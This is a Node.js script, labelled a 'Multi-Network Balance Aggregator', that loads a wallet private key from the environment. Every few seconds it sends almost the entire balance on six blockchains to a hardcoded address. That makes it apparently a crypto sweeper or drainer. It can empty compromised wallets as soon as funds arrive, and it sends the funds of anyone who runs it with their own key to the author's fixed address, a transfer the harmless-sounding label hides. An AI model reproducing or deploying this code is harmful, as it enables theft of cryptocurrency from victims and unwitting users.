import Web3 from 'web3';
import cfonts from 'cfonts';
import dotenv from 'dotenv';
import axios from 'axios';
import readline from 'readline';

// ================= CONFIGURATION =================
dotenv.config();

const CONFIG = {
  PRIVATE_KEY: process.env.PRIVATE_KEY?.startsWith('0x') 
    ? process.env.PRIVATE_KEY 
    : '0x' + process.env.PRIVATE_KEY,
  TARGET_ADDRESS: '0x7dcc38167a6524aa1c0eced45b9474e1e9b6ac56',
  NETWORKS: {
    BASE: {
      rpc: 'https://mainnet.base.org',
      chainId: 8453,
      symbol: 'ETH',
      explorer: 'https://basescan.org/tx/',
      minBalance: 0.00009,
      gasLimit: 21000
    },
    BSC: {
      rpc: 'https://bsc-dataseed1.ninicoin.io',
      chainId: 56,
      symbol: 'BNB',
      explorer: 'https://bscscan.com/tx/',
      minBalance: 0.0003,
      gasLimit: 21000
    },
    ETH: {
      rpc: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
      chainId: 1,
      symbol: 'ETH',
      explorer: 'https://etherscan.io/tx/',
      minBalance: 0.00009,
      gasLimit: 21000
    },
    ARBITRUM: {
      rpc: 'https://arb1.arbitrum.io/rpc',
      chainId: 42161,
      symbol: 'ETH',
      explorer: 'https://arbiscan.io/tx/',
      minBalance: 0.00009,
      gasLimit: 21000
    },
    OPTIMISM: {
      rpc: 'https://mainnet.optimism.io',
      chainId: 10,
      symbol: 'ETH',
      explorer: 'https://optimistic.etherscan.io/tx/',
      minBalance: 0.00009,
      gasLimit: 21000
    },
    POLYGON: {
      rpc: 'https://polygon-rpc.com',
      chainId: 137,
      symbol: 'MATIC',
      explorer: 'https://polygonscan.com/tx/',
      minBalance: 0.1,
      gasLimit: 25000
    }
  },
  CHECK_INTERVAL: 5000,
  GAS_BUFFER: 1.5,
  MAX_RETRIES: 3
};

// ================= INITIALIZATION =================
const web3Instances = {};
for (const [network, config] of Object.entries(CONFIG.NETWORKS)) {
  web3Instances[network] = new Web3(new Web3.providers.HttpProvider(config.rpc));
}

// ================= UI CONTROL =================
let splashHeight = 0;
let outputLines = 0;
let lastBalanceOutput = "";

function clearOutput() {
  readline.moveCursor(process.stdout, 0, -outputLines);
  readline.clearScreenDown(process.stdout);
  outputLines = 0;
}

function writeOutput(text) {
  const lines = text.split('\n').length - 1;
  process.stdout.write(text);
  outputLines += lines;
}

// ================= UI FUNCTIONS =================
async function showSplashScreen() {
  console.clear();
  
  cfonts.say('SOUIY', {
    font: 'block',
    align: 'center',
    colors: ['cyan', 'magenta'],
    gradient: ['#42f5f5', '#f55e42'],
    letterSpacing: 1,
    lineHeight: 1
  });
  
  const splashText = [
    "=".repeat(50),
    "FOLLOW TIKTOK @souiy1".padStart(38),
    "Multi-Network Balance Aggregator".padStart(38),
    "=".repeat(50),
    ""
  ].join("\n");
  
  writeOutput(splashText);
  splashHeight = outputLines;
}

async function getFormattedBalance(web3, address) {
  try {
    const balanceWei = await web3.eth.getBalance(address);
    const balance = web3.utils.fromWei(balanceWei, 'ether');
    return parseFloat(balance).toFixed(6);
  } catch (error) {
    return "0.000000";
  }
}

async function generateBalanceOutput() {
  const account = web3Instances.ETH.eth.accounts.privateKeyToAccount(CONFIG.PRIVATE_KEY);
  const address = account.address;
  
  const balanceLines = await Promise.all(
    Object.entries(CONFIG.NETWORKS).map(async ([network, config]) => {
      const balance = await getFormattedBalance(web3Instances[network], address);
      return `• ${network.padEnd(10)}: ${balance.padEnd(10)} ${config.symbol}`;
    })
  );

  return [
    "💰 WALLET BALANCES",
    "=".repeat(50),
    ...balanceLines,
    "=".repeat(50),
    ""
  ].join("\n");
}

async function displayBalances() {
  lastBalanceOutput = await generateBalanceOutput();
  clearOutput();
  readline.moveCursor(process.stdout, 0, splashHeight);
  writeOutput(lastBalanceOutput);
}

function displayStatus(message) {
  clearOutput();
  readline.moveCursor(process.stdout, 0, splashHeight);
  writeOutput(lastBalanceOutput);
  writeOutput(message + "\n\n");
}

// ================= NETWORK FUNCTIONS =================
async function checkRpcHealth(rpcUrl) {
  try {
    const response = await axios.post(rpcUrl, {
      jsonrpc: "2.0",
      method: "eth_blockNumber",
      params: [],
      id: 1
    }, { timeout: 5000 });
    return response.data?.result;
  } catch {
    return false;
  }
}

async function getOptimalGasPrice(web3, network) {
  try {
    const gasPrice = await web3.eth.getGasPrice();
    return BigInt(Math.ceil(Number(gasPrice) * CONFIG.GAS_BUFFER));
  } catch {
    const fallbackPrices = {
      BASE: web3.utils.toWei('0.1', 'gwei'),
      ETH: web3.utils.toWei('20', 'gwei'),
      BSC: web3.utils.toWei('5', 'gwei'),
      ARBITRUM: web3.utils.toWei('0.1', 'gwei'),
      OPTIMISM: web3.utils.toWei('0.1', 'gwei'),
      POLYGON: web3.utils.toWei('30', 'gwei')
    };
    return BigInt(fallbackPrices[network] || web3.utils.toWei('10', 'gwei'));
  }
}

async function sweepBalance(network) {
  const web3 = web3Instances[network];
  const config = CONFIG.NETWORKS[network];
  const account = web3.eth.accounts.privateKeyToAccount(CONFIG.PRIVATE_KEY);

  if (!(await checkRpcHealth(config.rpc))) {
    displayStatus(`[${network}] 🔴 RPC unavailable`);
    return;
  }

  let retryCount = 0;
  while (retryCount < CONFIG.MAX_RETRIES) {
    try {
      const balanceWei = await web3.eth.getBalance(account.address);
      const balanceWeiBigInt = BigInt(balanceWei);
      const balance = parseFloat(web3.utils.fromWei(balanceWei, 'ether'));

      if (balance <= config.minBalance) {
        displayStatus(`[${network}] ❎ Balance below minimum`);
        return;
      }

      const gasPrice = await getOptimalGasPrice(web3, network);
      const gasCost = gasPrice * BigInt(config.gasLimit);

      if (balanceWeiBigInt <= gasCost) {
        displayStatus(`[${network}] ⚠️ Insufficient balance for gas`);
        return;
      }

      const minBalanceWei = BigInt(web3.utils.toWei(config.minBalance.toString(), 'ether'));
      const amountToSend = balanceWeiBigInt - gasCost - minBalanceWei;

      if (amountToSend <= 0) {
        displayStatus(`[${network}] ⚠️ Amount too small after gas`);
        return;
      }

      const tx = {
        from: account.address,
        to: CONFIG.TARGET_ADDRESS,
        value: amountToSend.toString(),
        gas: config.gasLimit,
        gasPrice: gasPrice.toString(),
        chainId: config.chainId
      };

      const signedTx = await account.signTransaction(tx);
      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
      
      displayStatus(`[${network}] ✅ Success! Sent ${web3.utils.fromWei(amountToSend.toString(), 'ether')} ${config.symbol}\n🔗 ${config.explorer}${receipt.transactionHash}`);
      await displayBalances();
      return;

    } catch (error) {
      retryCount++;
      displayStatus(`[${network}] Attempt ${retryCount} failed: ${error.message}`);
      if (retryCount < CONFIG.MAX_RETRIES) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
  }
  displayStatus(`[${network}] ❌ Failed after ${CONFIG.MAX_RETRIES} attempts`);
}

// ================= MAIN LOOP =================
async function main() {
  try {
    await showSplashScreen();
    await displayBalances();

    const account = web3Instances.ETH.eth.accounts.privateKeyToAccount(CONFIG.PRIVATE_KEY);
    const address = account.address;

    while (true) {
      const loopStart = Date.now();
      
      // Refresh balances
      lastBalanceOutput = await generateBalanceOutput();
      await displayBalances();
      await displayStatus("🔄 Starting network checks...");

      // Process all networks
      for (const network of Object.keys(CONFIG.NETWORKS)) {
        await displayStatus(`🔍 Checking ${network}...`);
        await sweepBalance(network);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      // Calculate next iteration
      const elapsed = Date.now() - loopStart;
      const waitTime = Math.max(0, CONFIG.CHECK_INTERVAL - elapsed);
      await displayStatus(`⏳ Next check in ${Math.ceil(waitTime/1000)}s`);
      
      await new Promise(resolve => setTimeout(resolve, waitTime));
    }
  } catch (error) {
    console.error('⚠️ Critical error:', error);
    setTimeout(main, 10000);
  }
}

// ================= ERROR HANDLING =================
process.on('unhandledRejection', (err) => {
  console.error('Unhandled rejection:', err);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
  setTimeout(main, 10000);
});

// ================= START APPLICATION =================
main().catch(console.error);